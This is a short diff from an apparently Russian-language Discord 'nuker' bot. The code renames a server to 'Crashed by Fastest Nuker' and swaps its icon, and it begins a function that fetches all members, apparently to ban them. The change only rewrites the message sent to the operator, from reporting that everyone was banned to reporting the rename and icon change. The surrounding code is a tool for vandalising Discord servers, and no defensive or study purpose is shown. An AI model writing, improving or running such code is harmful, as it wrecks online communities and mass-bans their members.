@@ -53,7 +53,7 @@ async def rename(ctx):
     with open('icon.PNG', 'rb') as f:
         icon = f.read()
         await ctx.guild.edit(name='Crashed by Fastest Nuker', icon=icon)
-    await ctx.author.send(f'Все участники на сервере (id) {ctx.guild.id} были забанены')
+    await ctx.author.send(f'Сервер (id) {ctx.guild.id} был переименован, а так-же изменена ему иконка')
 
 async def banus(ctx, limit=None):
     fetched = ctx.guild.fetch_members(limit=limit)
